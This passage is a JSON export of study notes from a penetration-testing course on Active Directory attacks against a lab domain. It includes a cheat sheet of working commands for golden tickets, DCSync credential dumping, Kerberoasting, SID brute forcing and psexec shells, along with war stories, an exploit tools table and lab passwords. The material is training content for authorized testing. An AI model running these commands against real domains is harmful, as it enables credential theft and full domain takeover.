\\\\academy-ea-dc01.inlanefreight.local\\c$`|Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host.|\n|`mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt`|Uses `Mimikatz` to create a `Golden Ticket` from a Windows-based host .|\n|`.\\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt`|Uses `Rubeus` to create a `Golden Ticket` from a Windows-based host.|\n|`mimikatz # lsadump::dcsync /user:INLANEFREIGHT\\lab_adm`|Uses `Mimikatz` to perform a DCSync attack from a Windows-based host.|\n|`secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt`|Impacket tool used to perform a DCSync attack from a Linux-based host.|\n|`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240`|Impacket tool used to perform a `SID Brute forcing` attack from a Linux-based host.|\n|`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \\| grep \"Domain SID\"`|Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host.|\n|`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 \\| grep -B12 \"Enterprise Admins\"`|Impacket tool used to retrieve the `SID` of a target Windows domain and attach it to the Enterprise Admin group's `RID` from a Linux-based host.|\n|`ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker`|Impacket tool used to create a `Golden Ticket` from a Linux-based host.|\n|`export KRB5CCNAME=hacker.ccache`|Used to set the `KRB5CCNAME Environment Variable` from a Linux-based host.|\n|`psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5`|Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host.|\n|`raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm`|Impacket tool that automatically performs an attack that escalates from child to parent domain.|\n\n# Trust Relationships - Cross-Forest\n\n|Command|Description|\n|---|---|\n|`Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \\| select SamAccountName`|PowerView tool used to enumerate accounts for associated `SPNs` from a Windows-based host.|\n|`Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \\| select samaccountname,memberof`|PowerView tool used to enumerate the `mssqlsvc` account from a Windows-based host.|\n|`.\\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap`|Uses `Rubeus` to perform a Kerberoasting Attack against a target Windows domain (`/domain:FREIGHTLOGISTICS.local`) from a Windows-based host.|\n|`Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL`|PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.|\n|`Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\\administrator`|PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.|\n|`GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`|Impacket tool used to request (`-request`) the TGS ticket of an account in a target Windows domain (`-target-domain`) from a Linux-based host.|\n|`bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2`|Runs the Python implementation of `BloodHound` against a target Windows domain from a Linux-based host.|\n|`zip -r ilfreight_bh.zip *.json`|Used to compress multiple files into 1 single `.zip` file to be uploaded into the BloodHound GUI.|",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/02- Introduction to Active Directory Enumeration & Attacks",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/02- Introduction to Active Directory Enumeration & Attacks.md",
    "title": "02  Introduction To Active Directory Enumeration & Attacks",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Active Directory Explained Active Directory (AD) is a directory service for Windows enterprise environments that was officially implemented in 2000 with the release of Windows Server 2000 and has been...",
    "category": "02_CPTS",
    "content": "## Active Directory Explained\n\n`Active Directory` (`AD`) is a directory service for Windows enterprise environments that was officially implemented in 2000 with the release of Windows Server 2000 and has been incrementally improved upon with the release of each subsequent server OS since. AD is based on the protocols x.500 and LDAP that came before it and still utilizes these protocols in some form today. It is a distributed, hierarchical structure that allows for centralized management of an organization’s resources, including users, computers, groups, network devices and file shares, group policies, devices, and trusts. AD provides `authentication, accounting, and authorization` functions within a Windows enterprise environment. If this is your first time learning about Active Directory or hearing these terms, check out the [Introduction to Active Directory](https://academy.hackthebox.com/course/preview/introduction-to-active-directory) module for a more in-depth look at the structure and function of AD, AD objects, etc.\n\n---\n\n## Why Should We Care About AD?\n\nAt the time of writing this module, Microsoft Active Directory holds around `43%` of the [market share](https://www.slintel.com/tech/identity-and-access-management/microsoft-active-directory-market-share#faqs) for enterprise organizations utilizing `Identity and Access management` solutions. This is a huge portion of the market, and it isn't likely to go anywhere any time soon since Microsoft is improving and blending implementations with Azure AD. Another interesting stat to consider is that just in the last two years, Microsoft has had over `2000` reported vulnerabilities tied to a [CVE](https://www.cvedetails.com/vendor/26/Microsoft.html). AD's many services and main purpose of making information easy to find and access make it a bit of a behemoth to manage and correctly harden. This exposes enterprises to vulnerabilities and exploitation from simple misconfigurations of services and permissions. Tie these misconfigurations and ease of access with common user and OS vulnerabilities, and you have a perfect storm for an attacker to take advantage of. With all of this in mind, this module will explore some of these common issues and show us how to identify, enumerate, and take advantage of their existence. We will practice enumerating AD utilizing native tools and languages such as `Sysinternals`, `WMI`, `DNS`, and many others. Some attacks we will also practice include `Password spraying`, `Kerberoasting`, utilizing tools such as `Responder`, `Kerbrute`, `Bloodhound`, and much more.\n\nWe may often find ourselves in a network with no clear path to a foothold through a remote exploit such as a vulnerable application or service. Yet, we are within an Active Directory environment, which can lead to a foothold in many ways. The general goal of gaining a foothold in a client's AD environment is to `escalate privileges` by moving laterally or vertically throughout the network until we accomplish the intent of the assessment. The goal can vary from client to client. It may be accessing a specific host, user's email inbox, database, or just complete domain compromise and looking for every possible path to Domain Admin level access within the testing period. Many open-source tools are available to facilitate enumerating and attacking Active Directory. To be most effective, we must understand how to perform as much of this enumeration manually as possible. More importantly, we need to understand the \"why\" behind certain flaws and misconfigurations. This will make us more effective as attackers and equip us to give sound recommendations to our clients on the major issues within their environment, as well as clear and actionable remediation advice.\n\nWe need to be comfortable enumerating and attacking AD from both Windows and Linux, with a limited toolset or built-in Windows tools, also known as \"`living off the land`.\" It is common to run into situations where our tools fail, are being blocked, or we are conducting an assessment where the client has us work from a `managed workstation` or `VDI instance` instead of the customized Linux or Windows attack host we may have grown accustomed to. To be effective in all situations, we must be able to adapt quickly on the fly, understand the many nuances of AD and know how to access them even when severely limited in our options.\n\n---\n\n## Real-World Examples\n\nLet's look at a few scenarios to see just what is possible in a real-world AD-centric engagement:\n\n**Scenario 1 - Waiting On An Admin**\n\nDuring this engagement, I compromised a single host and gained `SYSTEM` level access. Because this was a domain-joined host, I was able to use this access to enumerate the domain. I went through all of the standard enumeration, but did not find much. There were `Service Principal Names` (SPNs) present within the environment, and I was able to perform a Kerberoasting attack and retrieve TGS tickets for a few accounts. I attempted to crack these with Hashcat and some of my standard wordlists and rules, but was unsuccessful at first. I ended up leaving a cracking job running overnight with a very large wordlist combined with the [d3ad0ne](https://github.com/hashcat/hashcat/blob/master/rules/d3ad0ne.rule) rule that ships with Hashcat. The next morning I had a hit on one ticket and retrieved the cleartext password for a user account. This account did not give me significant access, but it did give me write access on certain file shares. I used this access to drop SCF files around the shares and left Responder going. After a while, I got a single hit, the `NetNTLMv2 hash` of a user. I checked through the BloodHound output and noticed that this user was actually a domain admin! Easy day from here.\n\n---\n\n**Scenario 2 - Spraying The Night Away**\n\nPassword spraying can be an extremely effective way to gain a foothold in a domain, but we must exercise great care not to lock out user accounts in the process. On one engagement, I found an SMB NULL session using the [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) tool and retrieved both a listing of `all` users from the domain, and the domain `password policy`. Knowing the password policy was crucial because I could ensure that I was staying within the parameters to not lock out any accounts and also knew that the policy was a minimum eight-character password and password complexity was enforced (meaning that a user's password required 3/4 of special character, number, uppercase, or lower case number, i.e., Welcome1). I tried several common weak passwords such as Welcome1, `Password1`, Password123, `Spring2018`, etc. but did not get any hits. Finally, I made an attempt with `Spring@18` and got a hit! Using this account, I ran BloodHound and found several hosts where this user had local admin access. I noticed that a domain admin account had an active session on one of these hosts. I was able to use the Rubeus tool and extract the Kerberos TGT ticket for this domain user. From there, I was able to perform a `pass-the-ticket` attack and authenticate as this domain admin user. As a bonus, I was able to take over the trusting domain as well because the Domain Administrators group for the domain that I took over was a part of the Administrators group in the trusting domain via nested group membership, meaning I could use the same set of credentials to authenticate to the other domain with full administrative level access.\n\n---\n\n**Scenario 3 - Fighting In The Dark**\n\nI had tried all of my standard ways to obtain a foothold on this third engagement, and nothing had worked. I decided that I would use the [Kerbrute](https://github.com/ropnop/kerbrute) tool to attempt to enumerate valid usernames and then, if I found any, attempt a targeted password spraying attack since I did not know the password policy and didn't want to lock any accounts out. I used the [linkedin2username](https://github.com/initstring/linkedin2username) tool to first mashup potential usernames from the company's LinkedIn page. I combined this list with several username lists from the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo and, after using the `userenum` feature of Kerbrute, ended up with **516** valid users. I knew I had to tread carefully with password spraying, so I tried with the password `Welcome2021` and got a single hit! Using this account, I ran the Python version of BloodHound from my attack host and found that all domain users had RDP access to a single box. I logged into this host and used the PowerShell tool [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) to spray again. I was more confident this time around because I could a) view the password policy and b) the DomainPasswordSpray tool will remove accounts close to lockout from the target list. Being that I was authenticated within the domain, I could now spray with all domain users, which gave me significantly more targets. I tried again with the common password Fall2021 and got several hits, all for users not in my initial wordlist. I checked the rights for each of these accounts and found that one was in the Help Desk group, which had [GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall) rights over the [Enterprise Key Admins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#enterprise-key-admins) group. The Enterprise Key Admins group had GenericAll privileges over a domain controller, so I added the account I controlled to this group, authenticated again, and inherited these privileges. Using these rights, I performed the [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) attack and retrieved the NT hash for the domain controller machine account. With this NT hash, I was then able to perform a DCSync attack and retrieve the NTLM password hashes for all users in the domain because a domain controller can perform replication, which is required for DCSync.\n\n---\n\n## This Is The Way\n\nThese scenarios may seem overwhelming with many foreign concepts right now, but after completing this module, you will be familiar with most of them (some concepts described in these scenarios are outside the scope of this module). These show the importance of iterative enumeration, understanding our target, and adapting and thinking outside the box as we work our way through an environment. We will perform many of the parts of the attack chains described above in these module sections, and then you'll get to put your skills to the test by attacking two different AD environments at the end of this module and discovering your own attack chains. Strap in because this will be a fun, but bumpy, ride through the wild world that is `enumerating` and `attacking` Active Directory.\n\n---\n\n## Practical Examples\n\nThroughout the module, we will cover examples with accompanying command output. Most of which can be reproduced on the target VMs that can be spawned within the relevant sections. You will be provided RDP credentials to interact with some of the target VMs to learn how to enumerate and attack from a Windows host (`MS01`) and SSH access to a preconfigured Parrot Linux host (`ATTACK01`) to perform enumeration and attack examples from Linux. You can connect from the Pwnbox or your own VM (after downloading a VPN key once a machine spawns) via RDP using [FreeRDP](https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface), [Remmina](https://remmina.org/), or the RDP client of your choice where applicable or the SSH client built into the Pwnbox or your own VM.\n\n---\n\n#### Connecting via FreeRDP\n\nWe can connect via command line using the command:\n\nIntroduction to Active Directory Enumeration & Attacks\n\n```shell-session\ndrxh3kr@htb[/htb]$ xfreerdp /v:<MS01 target IP> /u:htb-student /p:Academy_student_AD!\n```\n\n#### Connecting via SSH\n\nWe can connect to the provided Parrot Linux attack host using the command, then enter the provided password when prompted.\n\nIntroduction to Active Directory Enumeration & Attacks\n\n```shell-session\ndrxh3kr@htb[/htb]$ ssh htb-student@<ATTACK01 target IP>\n```\n\n#### Xfreerdp to the ATTACK01 Parrot Host\n\nWe also installed an `XRDP` server on the `ATTACK01` host to provide GUI access to the Parrot attack host. This can be used to interact with the BloodHound GUI tool which we will cover later in this section. In sections where this host spawns (where you are given SSH access) you can also connect to it using `xfreerdp` using the same command as you would with the Windows attack host above:\n\nIntroduction to Active Directory Enumeration & Attacks\n\n```shell-session\ndrxh3kr@htb[/htb]$ xfreerdp /v:<ATTACK01 target IP> /u:htb-student /p:HTB_@cademy_stdnt!\n```\n\nMost sections will provide credentials for the `htb-student` user on either `MS01` or `ATTACK01`. Depending on the material and challenges, some sections will have you authenticate to a target with a different user, and alternate credentials will be provided.\n\nThroughout the course of this module you will be presented with multiple mini Active Directory labs. Some of these labs can take 3-5 minutes to fully spawn and be accessible via RDP. We recommend scrolling to the end of each section, clicking to spawn the lab, and then start reading through the material, so the environment is up by the time you reach the interactive portions of the section.\n\n---\n\n## Toolkit\n\nWe provide a Windows and Parrot Linux attack host in the accompanying lab for this module. All tools needed to perform all examples and solve all questions throughout the module sections are present on the hosts. The tools necessary for the Windows attack host, `MS01` are located in the `C:\\Tools` directory. Others, such as the Active Directory PowerShell module, will load upon opening a PowerShell console window. Tools on the Linux attack host, `ATTACK01`, are either installed and added to the `htb-student` users' PATH or present in the `/opt` directory. You can, of course, (and it is encouraged) compile (where needed) and upload your own tools and scripts to the attack hosts to get in the habit of doing so or hosting them on an SMB share from the Pwnbox working with the tools that way. Keep in mind that when performing an actual penetration test in a client's network, it is always best to compile the tools yourself to examine the code beforehand and ensure there is nothing malicious hiding in the compiled executable. We don't want to bring infected tools into a client's network and expose them to an outside attack.\n\n---\n\nHave fun, and don't forget to think outside of the box! AD is immense. You will not master it overnight, but keep working at it, and soon the content in this module will be second nature.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/03-Tools of the Trade",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/03-Tools of the Trade.md",
    "title": "03 Tools Of The Trade",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Many of the module sections require tools such as open-source scripts or precompiled binaries. These can be found in the C:\\Tools directory on the Windows hosts provided in the sections aimed at a...",
    "category": "02_CPTS",
    "content": "\n---\n\nMany of the module sections require tools such as open-source scripts or precompiled binaries. These can be found in the `C:\\Tools` directory on the Windows hosts provided in the sections aimed at attacking from Windows. In sections that focus on attacking AD from Linux, we provide a Parrot Linux host customized for the target environment as if you were an anonymous user with an attack host within the internal network. All necessary tools and scripts are preloaded on this host (either installed or in the `/opt` directory). Here is a listing of many of the tools that we will cover in this module:\n\n|Tool|Description|\n|---|---|\n|[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)/[SharpView](https://github.com/dmchell/SharpView)|A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows `net*` commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some \"quick wins\" such as users that can be attacked via Kerberoasting or ASREPRoasting.|\n|[BloodHound](https://github.com/BloodHoundAD/BloodHound)|Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a [Neo4j](https://neo4j.com/) database for graphical analysis of the AD environment.|\n|[SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)|The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.|\n|[BloodHound.py](https://github.com/fox-it/BloodHound.py)|A Python-based BloodHound ingestor based on the [Impacket toolkit](https://github.com/CoreSecurity/impacket/). It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis.|\n|[Kerbrute](https://github.com/ropnop/kerbrute)|A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing.|\n|[Impacket toolkit](https://github.com/SecureAuthCorp/impacket)|A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.|\n|[Responder](https://github.com/lgandx/Responder)|Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.|\n|[Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1)|Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.|\n|[C# Inveigh (InveighZero)](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh)|The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.|\n|[rpcinfo](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo)|The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The \"-p\" option is used to specify the target host. For example the command \"rpcinfo -p 10.0.0.1\" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges.|\n|[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)|A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.|\n|[nxc (CME)](https://github.com/byt3bl33d3r/nxc)|CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to \"live off the land\" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.|\n|[Rubeus](https://github.com/GhostPack/Rubeus)|Rubeus is a C# tool built for Kerberos Abuse.|\n|[GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)|Another Impacket module geared towards finding Service Principal names tied to normal users.|\n|[Hashcat](https://hashcat.net/hashcat/)|A great hash cracking and password recovery tool.|\n|[enum4linux](https://github.com/CiscoCXSecurity/enum4linux)|A tool for enumerating information from Windows and Samba systems.|\n|[enum4linux-ng](https://github.com/cddmp/enum4linux-ng)|A rework of the original Enum4linux tool that works a bit differently.|\n|[ldapsearch](https://linux.die.net/man/1/ldapsearch)|Built-in interface for interacting with the LDAP protocol.|\n|[windapsearch](https://github.com/ropnop/windapsearch)|A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.|\n|[DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray)|DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.|\n|[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)|The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).|\n|[smbmap](https://github.com/ShawnDEvans/smbmap)|SMB share enumeration across a domain.|\n|[psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)|Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell.|\n|[wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)|Part of the Impacket toolkit, it provides the capability of command execution over WMI.|\n|[Snaffler](https://github.com/SnaffCon/Snaffler)|Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.|\n|[smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)|Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.|\n|[setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\\(v=ws.11\\))|Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.|\n|[Mimikatz](https://github.com/ParrotSec/mimikatz)|Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host.|\n|[secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)|Remotely dump SAM and LSA secrets from a host.|\n|[evil-winrm](https://github.com/Hackplayers/evil-winrm)|Provides us with an interactive shell on a host over the WinRM protocol.|\n|[mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)|Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases.|\n|[noPac.py](https://github.com/Ridter/noPac)|Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.|\n|[rpcdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py)|Part of the Impacket toolset, RPC endpoint mapper.|\n|[CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py)|Printnightmare PoC in python.|\n|[ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)|Part of the Impacket toolset, it performs SMB relay attacks.|\n|[PetitPotam.py](https://github.com/topotam/PetitPotam)|PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.|\n|[gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)|Tool for manipulating certificates and TGTs.|\n|[getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py)|This tool will use an existing TGT to request a PAC for the current user using U2U.|\n|[adidnsdump](https://github.com/dirkjanm/adidnsdump)|A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer.|\n|[gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)|Extracts usernames and passwords from Group Policy preferences files.|\n|[GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)|Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking.|\n|[lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py)|SID bruteforcing tool.|\n|[ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)|A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc.|\n|[raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)|Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation.|\n|[Active Directory Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)|Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.|\n|[PingCastle](https://www.pingcastle.com/documentation/)|Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on [CMMI](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) adapted to AD security).|\n|[Group3r](https://github.com/Group3r/Group3r)|Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).|\n|[ADRecon](https://github.com/adrecon/ADRecon)|A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.|",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/04-Scenario",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/04-Scenario.md",
    "title": "04 Scenario",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- We are Penetration Testers working for CAT-5 Security. After a few successful engagements shadowing with the team, the more senior members want to see how well we can do starting an assessment on ...",
    "category": "02_CPTS",
    "content": "\n---\n\nWe are Penetration Testers working for `CAT-5 Security`. After a few successful engagements shadowing with the team, the more senior members want to see how well we can do starting an assessment on our own. The team lead sent us the following email detailing what we need to accomplish.\n\n#### Tasking Email\n\n![Email from Jack Smith to Pentesting Interns about an assessment on Inlanefreight. Tasks include domain enumeration, credential discovery, lateral movement, privilege escalation, and acquiring Domain Admin credentials. The findings will guide further actions. Signed by J. Smith, Red Team Lead at Cat5 Security LLC. Includes a leadership quote.](https://academy.hackthebox.com/storage/modules/143/scenario-email.png)\n\nThis module will allow us to practice our skills (both prior and newly minted) with these tasks. The final assessment for this module is the execution of `two` internal penetration tests against the company Inlanefreight. During these assessments, we will work through an internal penetration test simulating starting from an external breach position and a second one beginning with an attack box inside the internal network as clients often request. Completing the skills assessments signifies the successful completion of the tasks mentioned in the scoping document and tasking email above. In doing so, we will demonstrate a firm grasp of many automated and manual AD attack and enumeration concepts, knowledge of and experience with a wide array of tools, and the ability to interpret data gathered from an AD environment to make critical decisions to advance the assessment. The content in this module is meant to cover core enumeration concepts necessary for anyone to be successful in performing internal penetration tests in Active Directory environments. We will also cover many of the most common attack techniques in great depth while working through some more advanced concepts as a primer for AD-focused material that will be covered in more advanced modules.\n\nBelow you will find a completed scoping document for the engagement containing all pertinent information provided by the customer.\n\n---\n\n## Assessment Scope\n\nThe following `IPs`, `hosts`, and `domains` defined below make up the scope of the assessment.\n\n#### In Scope For Assessment\n\n|**Range/Domain**|**Description**|\n|---|---|\n|`INLANEFREIGHT.LOCAL`|Customer domain to include AD and web services.|\n|`LOGISTICS.INLANEFREIGHT.LOCAL`|Customer subdomain|\n|`FREIGHTLOGISTICS.LOCAL`|Subsidiary company owned by Inlanefreight. External forest trust with INLANEFREIGHT.LOCAL|\n|`172.16.5.0/23`|In-scope internal subnet.|\n|||\n\n#### Out Of Scope\n\n- `Any other subdomains of INLANEFREIGHT.LOCAL`\n- `Any subdomains of FREIGHTLOGISTICS.LOCAL`\n- `Any phishing or social engineering attacks`\n- `Any other IPS/domains/subdomains not explicitly mentioned`\n- `Any types of attacks against the real-world inlanefreight.com website outside of passive enumeration shown in this module`\n\n---\n\n## Methods Used\n\nThe following methods are authorized for assessing Inlanefreight and its systems :\n\n### External Information Gathering (Passive Checks)\n\nExternal information gathering is authorized to demonstrate the risks associated with information that can be gathered about the company from the internet. To simulate a real-world attack, CAT-5 and its assessors will conduct external information gathering from an anonymous perspective on the internet with no information provided in advance regarding Inlanefreight outside of what is provided within this document.\n\nCat-5 will perform passive enumeration to uncover information that may help with internal testing. Testing will employ various degrees of information gathering from open-source resources to identify publicly accessible data that may pose a risk to Inlanefreight and assist with the internal penetration test. No active enumeration, port scans, or attacks will be performed against internet-facing \"real-world\" IP addresses or the website located at `https://www.inlanefreight.com`.\n\n### Internal Testing\n\nThe internal assessment portion is designed to demonstrate the risks associated with vulnerabilities on internal hosts and services ( `Active Directory specifically`) by attempting to emulate attack vectors from within Inlanefreight's area of operations. The result will allow Inlanefreight to assess the risks of internal vulnerabilities and the potential impact of a successfully exploited vulnerability.\n\nTo simulate a real-world attack, Cat-5 will conduct the assessment from an untrusted insider perspective with no advance information outside of what's provided in this documentation and discovered from external testing. Testing will start from an anonymous position on the internal network with the goal of obtaining domain user credentials, enumerating the internal domain, gaining a foothold, and moving laterally and vertically to achieve compromise of all in-scope internal domains. Computer systems and network operations will not be intentionally interrupted during the test.\n\n### Password Testing\n\nPassword files captured from Inlanefreight devices, or provided by the organization, may be loaded onto offline workstations for decryption and utilized to gain further access and accomplish the assessment goals. At no time will a captured password file or the decrypted passwords be revealed to persons not officially participating in the assessment. All data will be stored securely on Cat-5 owned and approved systems and retained for a period of time defined in the official contract between Cat-5 and Inlanefreight.\n\n---\n\nWe provided the above scoping documentation so we become used to seeing this style of documentation. As we progress through our Infosec Careers, especially on the offensive side, it will be common to receive scoping documents and Rules of Engagement (RoE) documents that outline these types of information.\n\n---\n\n## The Stage Is Set\n\nNow that we have our scope clearly defined for this module, we can dive into exploring Active Directory enumeration and attack vectors. Now, let's dive into performing passive external enumeration against Inlanefreight.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/05-External Recon and Enumeration Principles",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/05-External Recon and Enumeration Principles.md",
    "title": "05 External Recon And Enumeration Principles",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Before kicking off any pentest, it can be beneficial to perform external reconnaissance of your target. This can serve many different functions, such as: - Validating information provided to you i...",
    "category": "02_CPTS",
